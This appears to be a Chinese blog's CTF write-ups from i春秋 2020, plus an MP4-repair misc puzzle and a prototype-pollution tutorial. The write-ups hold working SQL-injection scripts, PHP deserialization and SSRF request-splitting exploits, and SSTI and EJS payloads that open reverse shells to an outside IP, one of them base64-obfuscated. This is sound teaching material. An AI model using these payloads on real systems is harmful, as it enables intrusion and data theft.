class="headerlink" title="ezsqli"></a>ezsqli</h3><p>黑名单:<code>union.*select,or,in</code></p><p>因为盲注太麻烦,所以想用preg回溯次数来绕过,但是没用,最后也只能盲注了</p><p>用<code>0 ^ (1=0)</code>来盲注,因为过滤了<code>in</code>所以用sys系统库来绕过(<code>https://xz.aliyun.com/t/7169#toc-53</code>)</p><p><code>0 ^ (select substr(hex(group_concat(table_name)),1,1) from (SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database() GROUP BY table_name)a)</code></p><p>获取表名之后,还有一个难点就是,列名的获取,但是获取列名会用到<code>in</code>字符</p><p>因此考虑,无列名注入<code>union select</code>那个肯定不行</p><p>我们利用<code>((select 1,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code>来获取flag</p><p>当我们利用这个时,我们必须保证某一个相等,才能通过另外一个判断flag</p><p>有一点要注意的是</p><pre><code>mysql&gt; select &#39;f&#39;=&#39;F&#39;;+---------+| &#39;f&#39;=&#39;F&#39; |+---------+|       1 |+---------+</code></pre><p>用这种方法是无法区分大小写的,所幸这次比赛的flag都是小写</p><p>脚本</p><pre><code class="python">import requestsimport stringsql=&quot;1 ^ ((select substr(hex(group_concat(table_name)),POS,1) from (SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database() GROUP BY table_name)a)=GUESS)&quot;#f1ag_1s_h3r3_hhhhh,users233333333333333result=&quot;&quot;# l=len(result)# while True:#     l+=1#     ended=True#     for i in string.printable:#         sql=&quot;1 ^ ((select 0,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;#         sql=sql.replace(&quot;POS&quot;,str(l))#         sql=sql.replace(&quot;GUESS&quot;,(result+i).encode(&quot;hex&quot;).upper())#         res=requests.post(&quot;http://c957eb4253fb4275856dc45eb06d11ab05103bcf405348ab.changame.ichunqiu.com/index.php&quot;,data={&quot;id&quot;:sql})#         print(sql)#         if &quot;Hello Nu1L&quot; in res.text:#             result+=i#             print(result)#             ended=False#             break#     if ended:#         break#FLAG{9AD0BB6D-634F-4AEC-9DD8-B617774CD334}l=len(result)while True:    l+=1    ended=True    for j in range(32,128):        i=chr(j)        sql=&quot;0 ^ ((select 1,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;        sql=sql.replace(&quot;POS&quot;,str(l))        sql=sql.replace(&quot;GUESS&quot;,&#39;0x&#39;+(result+i).encode(&quot;hex&quot;).upper())        res=requests.post(&quot;http://c957eb4253fb4275856dc45eb06d11ab05103bcf405348ab.changame.ichunqiu.com/index.php&quot;,data={&quot;id&quot;:sql})        print(sql)        if &quot;Hello Nu1L&quot; in res.text:            result+=chr(ord(i)-1)            print(result)            ended=False            break    if ended:        break</code></pre><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><pre><code>class info:__call public function __call($name,$argument){//反序列化        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    }</code></pre><p>flag在flag.php中</p><p>文件读取点:</p><pre><code class="php">class Userpublic function __destruct(){//任意读        return file_get_contents($this-&gt;nickname);//危    }</code></pre><pre><code class="php">if($_SESSION[&#39;login&#39;]===1){    require_once(&quot;flag.php&quot;);    echo $flag;}</code></pre><p>现在有两种思路:</p><ol><li>反序列化读取文件</li><li>sql注入拿到管理原密码,来读取文件(x)</li></ol><p>无论想干啥都得先登陆,但是不知道咋登陆</p><p>考虑反序列化</p><p>如果我们成功登陆,攻击入口就是update.php</p><pre><code class="php">if ($_SESSION[&#39;login&#39;]!=1){    echo &quot;你还没有登陆呢！&quot;;}$users=new User();$users-&gt;update();if($_SESSION[&#39;login&#39;]===1){    require_once(&quot;flag.php&quot;);    echo $flag;}</code></pre><p>比较奇怪的是,按我所知,想要反序列化就要登陆,登陆的话他们就自己打出flag了,所以没有反序列化的必要?</p><p>认真看下好像没有die</p><pre><code class="php">if ($_SESSION[&#39;login&#39;]!=1){    echo &quot;你还没有登陆呢！&quot;;}</code></pre><p>反序列化的起点是:<code>$Info=unserialize($this-&gt;getNewinfo());</code></p><p>终点是:</p><pre><code class="php">class userpublic function __destruct(){//任意读        return file_get_contents($this-&gt;nickname);//危    }</code></pre><p>或</p><pre><code class="php">class Infopublic function __call($name,$argument){//反序列化        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    }</code></pre><p>因为<code>__destruct</code>的数据不知道怎么拿出来,我先考虑sql注入</p><p>如果,老老实实让他们序列化<code>Info</code>,好像啥都干不了</p><p>想办法利用<code>safe</code>函数在<code>Info</code>里面插个类,插个<code>UpdateHelper</code>然后利用其<code>__destruct</code>方法调用<code>User</code>的<code>__toString</code>函数,</p><p>再调用<code>login</code>方法,最后执行sql语句</p><pre><code class="php">function safe($parm){    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);    return str_replace($array,&#39;hacker&#39;,$parm);}class User{    public function update(){        $Info=unserialize($this-&gt;getNewinfo());        $age=$Info-&gt;age;        $nickname=$Info-&gt;nickname;        $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#39;id&#39;]);        //这个功能还没有写完 先占坑    }    public function getNewInfo(){            $age=$_POST[&#39;age&#39;];            $nickname=$_POST[&#39;nickname&#39;];            return safe(serialize(new Info($age,$nickname)));        }    public function __destruct(){//任意读            return file_get_contents($this-&gt;nickname);//危        }    public function __toString()    {        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    }}</code></pre><pre><code class="php">Class UpdateHelper{    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo,$sql){        $newInfo=unserialize($newInfo);        $upDate=new dbCtrl();    }    public function __destruct()    {        echo $this-&gt;sql;    }}</code></pre><p>脚本:</p><pre><code class="php">&lt;?phpClass UpdateHelper{    public $id=0;    public $newinfo=&quot;&quot;;    public $sql;    public function __construct($sql){        $this-&gt;sql=$sql;    }//    public function __destruct()//    {//        echo $this-&gt;sql;//    }}class Info{    public $age=&quot;&quot;;    public $nickname=&quot;&quot;;    public $CtrlCase;    public function __construct(){        $this-&gt;CtrlCase=new dbCtrl();    }//    public function __call($name,$argument){//反序列化//        echo $this-&gt;CtrlCase-&gt;login($argument[0]);//    }}class dbCtrl{    public $hostname = &quot;127.0.0.1&quot;;    public $dbuser = &quot;noob123&quot;;    public $dbpass = &quot;noob123&quot;;    public $database = &quot;noob123&quot;;//    public $hostname = &quot;127.0.0.1&quot;;//    public $dbuser = &quot;root&quot;;//    public $dbpass = &quot;123456&quot;;//    public $database = &quot;test&quot;;    public $name=&quot;admin&quot;;    public $password=&quot;1&quot;;    public $mysqli;    public $token;}class User{    public $id=0;    public $age;    public $nickname;    public function __construct()    {        $this-&gt;nickname=new Info();        $this-&gt;age=&#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#39;;    }}function escape($str){    $evil=&#39;&#39;;    $len=strlen($str)+2;    if($len%2)    {        $evil.=&quot;union&quot;;        $len-=1;    }    $len/=2;    while($len)    {        $evil.=&quot;load&quot;;        $len-=1;    }    return $evil.&#39;&quot;;&#39;.$str;}$call__tostring=new UpdateHelper(new User());$ser= urlencode(serialize($call__tostring));echo urlencode(escape(&quot;s:8:\&quot;CtrlCase\&quot;;&quot;.urldecode($ser).&#39;;};&#39;));</code></pre><p><code>flag{7989f259-3281-4c1c-8939-dc8bc0b5375b}</code></p><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><pre><code class="php">&lt;?php     function check($str)    {        if(preg_match(&#39;/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i&#39;,$str,$matches))        {            print_r($matches);            return 0;        }        else        {            return 1;        }    }    try    {        $db = new PDO(&#39;mysql:host=localhost;dbname=pdotest&#39;,&#39;root&#39;,&#39;******&#39;);    }     catch(Exception $e)    {        echo $e-&gt;getMessage();    }    if(isset($_GET[&#39;id&#39;]))    {        $id = $_GET[&#39;id&#39;];    }    else    {        $test = $db-&gt;query(&quot;select balabala from table1&quot;);        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);        $id = $res[&#39;balabala&#39;];    }    if(check($id))    {        $query = &quot;select balabala from table1 where 1=?&quot;;        $db-&gt;query(&quot;set names gbk&quot;);        $row = $db-&gt;prepare($query);        $row-&gt;bindParam(1,$id);        $row-&gt;execute();    }</code></pre><p>利用宽字节来逃出引号包围,payload:<code>%bf%27;</code></p><p>但是没有找到有效的sql时间盲注语句,正则来延时也没用,加上select被过滤,</p><p>我缺少了一个关键的知识</p><p>在学长的提示下,被认为不可以堆叠注入的pdo居然可以(我哪来的认知????)</p><p>然后就简单了</p><pre><code>set @t=0x73656C65637420736C65657028313029;PREPARE sqla from @t;EXECUTE sqla;</code></pre><p>python脚本</p><pre><code class="python">import requestsdef sql_inj(sql):    sql=&quot;0x&quot;+sql.encode(&quot;hex&quot;)    tpl=&quot;set @t=TGT;PREPARE sqla from @t;EXECUTE sqla;&quot;.replace(&quot;TGT&quot;,sql)    url=&quot;http://b0ae8f49254247b8815616a4711941f17f2a145a8a374167.changame.ichunqiu.com/&quot;    param={        &quot;id&quot;:&quot;\xbf\x27;&quot;+tpl    }    requests.get(url,params=param,timeout=2)#696E666F726D6174696F6E5F736368656D612C6D7973716C2C70646F746573742C706572666F726D616E63655F736368656D61#table1#balabala,eihey,fllllll4g,bbbresult=&quot;&quot;count=1+len(result)while True:    lock=0    for i in &quot;0123456789ABCDEF&quot;:        #UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#39;tablename&#39;        try :            sql=&quot;select if(substr(hex(group_concat(COL)),POS,1)=&#39;GUESS&#39;,sleep(3),0) from TABLE WHERE&quot;.replace(&quot;COL&quot;,&quot;fllllll4g&quot;)            sql=sql.replace(&quot;GUESS&quot;,i).replace(&quot;TABLE&quot;,&quot;table1&quot;)            sql=sql.replace(&quot;WHERE&quot;,&quot;&quot;)            sql=sql.replace(&quot;POS&quot;,str(count))            sql_inj(sql)            print(sql)        except :            result+=i            print(result)            lock=1            break    if not lock:        break    count+=1</code></pre><h3 id="black-list"><a href="#black-list" class="headerlink" title="black_list"></a>black_list</h3><p>这题让我学到一个骚操作和看到一篇好文章</p><pre><code>return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>利用堆叠注入查询</p><pre><code>array(1) {  [0]=&gt;  string(8) &quot;FlagHere&quot;}array(1) {  [0]=&gt;  string(5) &quot;words&quot;}</code></pre><pre><code>1&#39;;show create table words;#array(2) {  [0]=&gt;  string(5) &quot;words&quot;  [1]=&gt;  string(114) &quot;CREATE TABLE `words` (  `id` int(10) NOT NULL,  `data` varchar(20) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;}1&#39;;show create table FlagHere;#array(2) {  [0]=&gt;  string(8) &quot;FlagHere&quot;  [1]=&gt;  string(93) &quot;CREATE TABLE `FlagHere` (  `flag` varchar(100) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;}</code></pre><p>利用handler来读取数据</p><p><code>1&#39;;handler FlagHere open;handler FlagHere read first;#</code></p><h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p><code>2</code></p><p>过滤<code>import,os</code></p><pre><code>{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')}}{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')|attr('__subcl'+'asses__')()}}{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')|attr('__subcl'+'asses__')()|attr('__dict__')}}{{config.__class__.__mro__[1].__subclasses__()[-2].__init__.__globals__['o'+'s'].__dict__['sys'+'tem']('echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjM5LjEwOC4xNjQuMjE5Iiw2MDAwMykpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p|base'+'64 -d | python')}}</code></pre><h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p> <a href="https://github.com/nodejs/node/issues/13296" target="_blank" rel="noopener">https://github.com/nodejs/node/issues/13296</a> </p><p> <a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" target="_blank" rel="noopener">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</a> </p><p>这题有个upload函数</p><pre><code class="javascript">app.post(&#39;/file_upload&#39;, function(req, res){    var ip = req.connection.remoteAddress;    var obj = {        msg: &#39;&#39;,    }    if (!ip.includes(&#39;127.0.0.1&#39;)) {        obj.msg=&quot;only admin&#39;s ip can use it&quot;        res.send(JSON.stringify(obj));        return     }    fs.readFile(req.files[0].path, function(err, data){        if(err){            obj.msg = &#39;upload failed&#39;;            res.send(JSON.stringify(obj));        }else{            var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if(!fs.existsSync(__dirname + file_path)){                try {                    fs.mkdirSync(__dirname + file_path)                } catch (error) {                    obj.msg = &quot;file type error&quot;;                    res.send(JSON.stringify(obj));                    return                }            }            try {                fs.writeFileSync(dir_file,data)                obj = {                    msg: &#39;upload success&#39;,                    filename: file_path + file_name                }             } catch (error) {                obj.msg = &#39;upload failed&#39;;            }            res.send(JSON.stringify(obj));            }    })})</code></pre><p>但是需要本地访问</p><p>有一个ssrf的点:</p><pre><code class="javascript">app.get(&#39;/core&#39;, function(req, res) {    var q = req.query.q;    var resp = &quot;&quot;;    if (q) {        var url = &#39;http://localhost:8081/source?&#39; + q        var trigger = blacklist(url);        if (trigger === true) {            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);        } else {            try {                http.get(url, function(resp) {                    resp.setEncoding(&#39;utf8&#39;);                    resp.on(&#39;error&#39;, function(err) {                    if (err.code === &quot;ECONNRESET&quot;) {                     console.log(&quot;Timeout occurs&quot;);                     return;                    }                   });                    resp.on(&#39;data&#39;, function(chunk) {                        try {                         resps = chunk.toString();                         res.send(resps);                        }catch (e) {                           res.send(e.message);                        }                    }).on(&#39;error&#39;, (e) =&gt; {                         res.send(e.message);});                });            } catch (error) {                console.log(error);            }        }    } else {        res.send(&quot;search param &#39;q&#39; missing!&quot;);    }})</code></pre><p>我们利用nodejs 8及之前的<code>utf-8</code>转<code>latin1</code>的漏洞来进行ssrf</p><pre><code>&gt; http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output[ &#39;GET /čĊ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p>payload:</p><pre><code class="python">import hashlibfrom urllib.parse import quote, unquoteimport requestsimport socket                                                                                                          file=&#39;&#39;&#39;------WebKitFormBoundaryVneK8P7cpLasJSn8Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;Content-Type: ../templatedoctype htmlhtml  head  body    include ../../../../../../flag.txt------WebKitFormBoundaryVneK8P7cpLasJSn8--&#39;&#39;&#39;.replace(&quot;\r\n&quot;,&quot;\n&quot;).replace(&quot;\n&quot;,&quot;\r\n&quot;)body=&#39;&#39;&#39; HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: xContent-Length: %dContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryVneK8P7cpLasJSn8Connection: keep-alive%sGET /core HTTP/1.1Host: xConnection: keep-alivex:&#39;&#39;&#39; %(len(file),file)body=body.replace(&quot;\r\n&quot;,&quot;\n&quot;).replace(&quot;\n&quot;,&quot;\r\n&quot;)uni = {     &#39;/&#39;: quote(&#39;\u012f&#39;.encode(&#39;utf-8&#39;)),    &#39; &#39;: quote(&#39;\u0120&#39;.encode(&#39;utf-8&#39;)),    &#39;\n&#39;: quote(&#39;\u010a&#39;.encode(&#39;utf-8&#39;)),    &#39;\r&#39;: quote(&#39;\u010d&#39;.encode(&#39;utf-8&#39;)),    &#39;&quot;&#39;: quote(&#39;\u0122&#39;.encode(&#39;utf-8&#39;)),    &quot;&#39;&quot;: quote(&#39;\u0127&#39;.encode(&#39;utf-8&#39;)),    &#39;!&#39;: quote(&#39;\u0121&#39;.encode(&#39;utf-8&#39;)),    &#39;o&#39;: quote(&#39;\u016f&#39;.encode(&#39;utf-8&#39;)),    &#39;e&#39;: quote(&#39;\u0165&#39;.encode(&#39;utf-8&#39;)),}print(uni)host=&quot;&quot;payload = &#39;%s&#39; % bodyfor c, encoded in uni.items():    payload = payload.replace(c, encoded)print(payload)requests.get(&quot;http://123.57.212.112:33321/core?q=&quot;+payload)</code></pre><p><code>flag{8ed05e41-c306-4f0f-a958-6759f66890e9}</code></p><h3 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h3><p><code>https://xz.aliyun.com/t/7184#toc-7</code></p><p><code>https://xz.aliyun.com/t/6113#toc-4</code></p><pre><code>router.post(&#39;/action&#39;, function (req, res) {  if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)}   req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&quot;);  });</code></pre><p>类似js原型链污染的点</p><p>但是需要<code>req.session.user.user==ADMIN</code></p><pre><code class="javascript">router.post(&#39;/login&#39;, function (req, res) {  if(req.body.Submit==&quot;register&quot;){   if(safeKeyword(req.body.userid)){    res.end(&quot;&lt;script&gt;alert(&#39;forbid word&#39;);history.go(-1);&lt;/script&gt;&quot;)    }    req.session.user={      &#39;user&#39;:req.body.userid.toUpperCase(),      &#39;passwd&#39;: req.body.pwd,      &#39;isLogin&#39;:false    }    res.redirect(&#39;/&#39;);   }  else if(req.body.Submit==&quot;login&quot;){    if(!req.session.user){res.end(&quot;&lt;script&gt;alert(&#39;register first&#39;);history.go(-1);&lt;/script&gt;&quot;)}    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd){      req.session.user.isLogin=true;    }    else{      res.end(&quot;&lt;script&gt;alert(&#39;error passwd&#39;);history.go(-1);&lt;/script&gt;&quot;)    }  }  res.redirect(&#39;/&#39;); ;});function safeKeyword(keyword) {  if(keyword.match(/(admin)/is)) {      return keyword  }  return undefined}</code></pre><p>谷歌找到<code>https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</code>,关于<code>toUpperCase</code>的一些特性,来绕过<code>safeKeyword</code></p><p>payload:<code>userid=adm%C4%B1n&amp;pwd=a&amp;action=login&amp;Submit=register</code> | <code>admın</code></p><p>最后污染<code>ejs</code>来拿到flag(<code>https://xz.aliyun.com/t/6113#toc-4</code>)</p><pre><code>{&quot;Submit&quot;:&quot;&quot;,&quot;lud&quot;:1,&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;a; global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/39.108.164.219/60003 0&gt;&amp;1\&quot;&#39;);//&quot;}}</code></pre><h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p><a href="http://www.zip下载源码" target="_blank" rel="noopener">www.zip下载源码</a></p><p>输入不存在的路径发现是tp6.0.0,刚好有个session直接写的漏洞</p><p>全局搜索session,发现</p><pre><code class="php"> $record = session(&quot;Record&quot;);            if (!session(&quot;Record&quot;))            {                session(&quot;Record&quot;,$data[&quot;key&quot;]);            }</code></pre><p>然后getshell</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/26/i春秋2020/">https://www.ccreater.top/2020/02/26/i春秋2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某misc</title>
      <link href="2020/02/20/%E6%9F%90misc/"/>
      <url>2020/02/20/%E6%9F%90misc/</url>
      
        <content type="html"><![CDATA[<h1 id="不知道哪里的misc"><a href="#不知道哪里的misc" class="headerlink" title="不知道哪里的misc"></a>不知道哪里的misc</h1><p>题目给了一个压缩包</p><p>里面有一个加密的视频文件和未加密的图片</p><p><img src="https://i.loli.net/2020/02/19/ptInrs6axclk12u.png" alt="image105"></p><p>想着图片会不会有提示,用hxd打开发现末尾果然有提示</p><p>kobe code</p><p><img src="https://i.loli.net/2020/02/19/mVqDzgoHdyOWBnT.png" alt="image211"></p><p>得到密码:<code>OAEBEYTKNRBANB</code>,成功拿到视频文件</p><p>但是提示文件无法打开,用binwalk啥的弄了一会,发现里面没有藏啥</p><p>于是换了个思路,猜测这题是要让我们修复mp4文件?头大</p><blockquote><p>一个MP4文件首先会有且只有一个“ftyp”类型的box，作为MP4格式的标志并包含关于文件的一些信息；之后会有且只有一个“moov”类型的box（Movie Box），它是一种container box，子box包含了媒体的metadata信息；MP4文件的媒体数据包含在“mdat”类型的box（Midia Data Box）中，该类型的box也是container box，可以有很多个，也可以没有（当媒体数据全部引用其他文件时），媒体数据的结构由metadata进行描述。</p></blockquote><p><img src="https://i.loli.net/2020/02/19/NVA3PtERXBqfwcd.png" alt="image622"></p><p>图中方框即为第一个box的head,原本应该是<code>ftyp(0x66747970)</code>而这里确实<code>66459707</code>,位置反了</p><p>恢复脚本</p><pre><code class="python">with open(&#39;NBA.mp4&#39;, &#39;rb&#39;) as f:    keydata =f.read()t= keydata.encode(&quot;hex&quot;)l=len(t)t2=&quot;&quot;for i in range(0,l,2):    a=t[i]    b=t[i+1]    t2+=b    t2+=aprint t2[:100]t2=t2.decode(&quot;hex&quot;)f2 = open(&#39;NBA2.mp4&#39;, &#39;wb&#39;)f2.write(t2)</code></pre><p>等脚本跑完后成功恢复原来的视频文件</p><p>视频隐写通常把内容存储在视频中的某个图片,我们用 ffmpeg ,将视频分离成图片</p><p><code>ffmpeg -i NBA2.mp4 -f image2 image%d.jpg</code></p><p>一张一张看过去,我们发现,在第3028张突然全黑了</p><p><img src="https://i.loli.net/2020/02/20/Q9dsOuiVGFgwAcm.png" alt="image1136"></p><p>调整一下图片的对比对,跑出一个二维码</p><p><img src="https://i.loli.net/2020/02/20/aE3PpqcrJzn852V.png" alt="image1223"></p><p><code>flag{I_l0v3_pl4ying_b4sk3tb4ll}</code></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/20/某misc/">https://www.ccreater.top/2020/02/20/某misc/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 做题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js原型链污染</title>
      <link href="2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h1><p> <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a> </p><h2 id="什么是原型链"><a href="#什么是原型链" class="headerlink" title="什么是原型链"></a>什么是原型链</h2><p> 每个实例对象（ object ）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong> ）。该原型对象也有一个自己的原型对象( <strong>proto</strong> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。 </p><pre><code class="javascript">function Foo{    this.a=&quot;456&quot;;    this.c=&quot;777&quot;}Foo.prototype.b=&quot;123&quot;;Foo.prototype.c=&quot;789&quot;;var foo=new Foo();console.log(foo.a);//456    console.log(foo.b);//123console.log(foo.c);//777</code></pre><p>当在当前对象找不到属性或方法时便会向上(<code>__proto__</code>中)寻找</p><ol><li>在对象foo中寻找b</li><li>如果找不到，则在<code>foo.__proto__</code>中寻找b</li><li>如果仍然找不到，则继续在<code>foo.__proto__.__proto__</code>中寻找b</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><h2 id="什么时原型链污染"><a href="#什么时原型链污染" class="headerlink" title="什么时原型链污染"></a>什么时原型链污染</h2><p>当我们修改对象的<code>__proto__</code>属性时,就相当于修改对象的父类</p><p>当调用不存在的方法或属性时便会在父类中寻找,就变相的控制了这个类</p><pre><code class="javascript">let foo = {bar: 1}// foo.bar 此时为1console.log(foo.bar)// 修改foo的原型（即Object）foo.__proto__.bar = 2// 由于查找顺序的原因，foo.bar仍然是1console.log(foo.bar)// 此时再用Object创建一个空的zoo对象let zoo = {}// 查看zoo.barconsole.log(zoo.bar)</code></pre><h2 id="哪些情况原型链会被污染"><a href="#哪些情况原型链会被污染" class="headerlink" title="哪些情况原型链会被污染"></a>哪些情况原型链会被污染</h2><h3 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h3><h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h3><h3 id="jQuery-extend"><a href="#jQuery-extend" class="headerlink" title="jQuery.extend"></a>jQuery.extend</h3><p><em>$</em>.extend( target [, object1 ] [, objectN ] )</p><p>指示是否深度合并</p><p><em>$</em>.extend( [deep ], target, object1 [, objectN ] )</p><p><strong>警告:</strong> 不支持第一个参数传递 false 。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>deep</em></td><td align="left">可选。 Boolean类型 指示是否深度合并对象，默认为false。如果该值为true，且多个对象的某个同名属性也都是对象，则该”属性对象”的属性也将进行合并。</td></tr><tr><td align="left"><em>target</em></td><td align="left">Object类型 目标对象，其他对象的成员属性将被附加到该对象上。</td></tr><tr><td align="left"><em>object1</em></td><td align="left">可选。 Object类型 第一个被合并的对象。</td></tr><tr><td align="left"><em>objectN</em></td><td align="left">可选。 Object类型 第N个被合并的对象。</td></tr></tbody></table><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目代码</p><p>car.class.js</p><pre><code class="javascript">class Car {    constructor(type, model, color, pic, key=&quot;&quot;) {        this.type = type        this.model = model        this.color = color        this.key = key        this.pic = pic        let started = false        this.start = () =&gt; {            started = true        }        this.isStarted = () =&gt; {            return started        }    }    powerOn() {        if (this.isStarted()) {            infobox(`Well Done!`)            nextCar()        } else {            $(&#39;.chargeup&#39;)[0].play()        }    }    info() {        infobox(`This car is a ${this.type} ${this.model} in ${this.color}. It looks very nice! But it seems to be broken ...`)    }    repair() {        if(urlParams.has(&#39;repair&#39;)) {            $.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))        }    }    light() {        infobox(`You turn on the lights ... Nothing happens.`)    }    battery() {        infobox(`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`)    }    ignition() {        if (this.key == &quot;&quot;) {            infobox(`Looks like the key got lost. No wonder the car is not starting ...`)        }        if (this.key == &quot;🔑&quot;) {            infobox(`The car started!`)            this.start()        }    }}</code></pre><p>util.js</p><pre><code class="javascript">const urlParams = new URLSearchParams(window.location.search)const h = location.hash.slice(1)const bugatti = new Car(&#39;Bugatti&#39;, &#39;T35&#39;, &#39;green&#39;, &#39;assets/images/bugatti.png&#39;)const porsche = new Car(&#39;Porsche&#39;, &#39;911&#39;, &#39;yellow&#39;, &#39;assets/images/porsche.png&#39;)const cars = [bugatti, porsche]porsche.repair = () =&gt; {    if(!bugatti.isStarted()){        infobox(`Not so fast. Repair the other car first!`)    }    else if($.md5(porsche) == &#39;9cdfb439c7876e703e307864c9167a15&#39;){        if(urlParams.has(&#39;help&#39;)) {            repairWithHelper(urlParams.get(&#39;help&#39;))        }    }    else{        infobox(`Repairing this is not that easy.`)    }}porsche.ignition = () =&gt; {    infobox(`Hmm ... WTF!`)}$(document).ready(() =&gt; {    const [car] = cars    $(&#39;.fa-power-off&#39;).click(() =&gt; car.powerOn())    $(&#39;.fa-car&#39;).click(() =&gt; car.info())    $(&#39;.fa-lightbulb-o&#39;).click(() =&gt; car.light())    